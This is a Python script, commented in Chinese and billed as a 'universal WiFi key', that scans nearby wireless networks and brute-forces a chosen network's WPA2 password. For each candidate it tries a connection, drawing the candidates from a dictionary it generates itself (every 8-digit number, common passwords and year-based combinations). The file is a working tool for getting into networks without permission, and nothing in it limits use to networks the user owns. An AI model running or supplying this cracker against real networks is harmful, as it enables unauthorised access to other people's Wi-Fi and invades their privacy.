# -*- coding: utf-8 -*-
try:
    import pywifi
    from pywifi import const
except ImportError:
    print("错误：未能导入pywifi模块")
    print("请检查：")
    print("1. 是否已安装pywifi：pip install pywifi")
    print("2. 是否使用了正确的Python环境")
    print("3. 在Linux系统下是否使用sudo运行脚本")
    exit(1)

import time
import os
import itertools
import string

def check_root():
    """检查是否具有root权限"""
    return os.geteuid() == 0  # 在Linux系统中检查是否为root用户

# WiFi扫描模块
def wifi_scan():
    # 初始化wifi
    wifi = pywifi.PyWiFi()
    # 使用第一个无线网卡
    interface = wifi.interfaces()[0]
    # 开始扫描
    interface.scan()
    for i in range(4):
        time.sleep(1)
        print('scanning...')
    print('\r扫描完成！\n' + '-' * 38)
    print('\r{:4}{:6}{}'.format('编号', '信号强度', 'wifi名'))
    # 扫描结果，scan_results()返回一个集，存放的是每个wifi对象
    bss = interface.scan_results()
    # 存放wifi名的集合
    wifi_name_set = set()
    for w in bss:
        # 解决乱码问题
        wifi_name_and_signal = (100 + w.signal, w.ssid.encode('raw_unicode_escape').decode('utf-8'))
        wifi_name_set.add(wifi_name_and_signal)
    # 存入列表并按信号排序
    wifi_name_list = list(wifi_name_set)
    wifi_name_list = sorted(wifi_name_list, key=lambda a: a[0], reverse=True)
    num = 0
    # 格式化输出
    while num < len(wifi_name_list):
        print('\r{:<6d}{:<8d}{}'.format(num, wifi_name_list[num][0], wifi_name_list[num][1]))
        num += 1
    print('-' * 38)
    # 返回wifi列表
    return wifi_name_list

# WIFI猜解模块
def wifi_password_crack(wifi_name):
    # 使用默认的密码字典路径
    wifi_dic_path = 'wifi_passwords.txt'
    if not os.path.exists(wifi_dic_path):
        print("未找到密码字典文件，正在重新生成...")
        wifi_dic_path = generate_password_dict()
        if not wifi_dic_path:
            print("生成密码字典失败，程序退出")
            exit(1)
    
    print(f"使用密码字典：{wifi_dic_path}")
    # 遍历密码
    with open(wifi_dic_path, 'r') as f:
        for pwd in f:
            # 去除密码的末尾换行符
            pwd = pwd.strip('\n')
            # 创建wifi对象
            wifi = pywifi.PyWiFi()
            # 创建网卡对象，为第一个wifi网卡
            interface = wifi.interfaces()[0]
            # 断开所有wifi连接
            interface.disconnect()
            # 等待其断开
            while interface.status() == 4:
                # 当其处于连接状态时，利用循环等待其断开
                pass
            # 创建连接文件（对象）
            profile = pywifi.Profile()
            # wifi名称
            profile.ssid = wifi_name
            # 需要认证
            profile.auth = const.AUTH_ALG_OPEN
            # wifi默认加密算法
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            # wifi密码
            profile.key = pwd
            # 删除所有wifi连接文件
            interface.remove_all_network_profiles()
            # 设置新的wifi连接文件
            tmp_profile = interface.add_network_profile(profile)
            # 开始尝试连接
            interface.connect(tmp_profile)
            start_time = time.time()
            while time.time() - start_time < 1.5:
                # 接口状态为4代表连接成功（当尝试时间大于1.5秒之后则为错误密码，经测试测正确密码一般都在1.5秒内连接，若要提高准确性可以设置为2s或以上，相应猜解速度就会变慢）
                if interface.status() == 4:
                    print('连接成功!密码为：{}'.format(pwd))
                    exit(0)
                else:
                    print('正在利用密码 {} 尝试猜解。'.format(pwd))

# 添加生成密码字典的函数
def generate_password_dict(save_path='wifi_passwords.txt'):
    """
    生成密码字典并保存到文件
    :param save_path: 保存路径，默认为当前目录下的wifi_passwords.txt
    """
    passwords = set()
    
    # 添加一些常见密码
    common_passwords = [
        '12345678', 'password', '88888888', '123456789',
        'admin123', 'adminadmin', 'password123',
        'wifi123', 'internet', 'abc12345'
    ]
    passwords.update(common_passwords)
    
    # 生成8位数字组合
    digits = ''.join(str(i) for i in range(10))
    for pwd in itertools.product(digits, repeat=8):
        passwords.add(''.join(pwd))
    
    # 生成常见年份+常见4位数字组合
    years = [str(year) for year in range(2000, 2025)]
    common_numbers = ['0000', '1234', '5678', '1111', '2222', '3333', '4444']
    for year in years:
        for num in common_numbers:
            passwords.add(year + num)
    
    # 保存到文件
    try:
        with open(save_path, 'w') as f:
            for pwd in sorted(passwords):
                f.write(pwd + '\n')
        print(f"密码字典已生成，保存在：{save_path}")
        print(f"共生成了 {len(passwords)} 个密码组合")
        return save_path
    except Exception as e:
        print(f"生成密码字典时出错：{e}")
        return None

def main():
    # 检查权限
    if os.name == 'posix' and not check_root():  # posix表示Linux/Unix系统
        print("错误：需要root权限才能访问WiFi接口")
        print("请使用 sudo python wify_gess.py 运行脚本")
        exit(1)

    # 检查WiFi接口
    wifi = pywifi.PyWiFi()
    if len(wifi.interfaces()) == 0:
        print("错误：未找到可用的WiFi接口")
        print("请检查：")
        print("1. 是否已启用WiFi")
        print("2. 是否有权限访问WiFi接口")
        exit(1)

    # 退出标致
    exit_flag = 0
    # 目标编号
    target_num = -1
    while not exit_flag:
        try:
            print('WiFi万能钥匙'.center(35, '-'))
            # 调用扫描模块，返回一个排序后的wifi列表
            wifi_list = wifi_scan()
            # 让用户选择要猜解的wifi编号，并对用户输入的编号进行判断和异常处理
            choose_exit_flag = 0
            while not choose_exit_flag:
                try:
                    target_num = int(input('请选择你要尝试猜解的wifi：'))
                    # 如果要选择的wifi编号在列表内，继续二次判断，否则重新输入
                    if target_num in range(len(wifi_list)):
                        # 二次确认
                        while not choose_exit_flag:
                            try:
                                choose = str(input('你选择要猜解的WiFi名称是：{}，确定吗？（Y/N）'.format(wifi_list[target_num][1])))
                                # 对用户输入进行小写处理，并判断
                                if choose.lower() == 'y':
                                    choose_exit_flag = 1
                                elif choose.lower() == 'n':
                                    break
                                # 处理用户其它字母输入
                                else:
                                    print('只能输入 Y/N 哦o(*￣︶￣*)o')
                            # 处理用户非字母输入
                            except ValueError:
                                print('只能输入 Y/N 哦o(*￣︶￣*)o')
                        # 退出猜解
                        if choose_exit_flag == 1:
                            break
                        else:
                            print('请重新输入哦(*^▽^*)')
                except ValueError:
                    print('只能输入数字哦o(*￣︶￣*)o')
            # 密码猜解，传入用户选择的wifi名称
            wifi_password_crack(wifi_list[target_num][1])
            print('-' * 38)
            exit_flag = 1
        except Exception as e:
            print(e)
            raise e


if __name__ == '__main__':
    main()
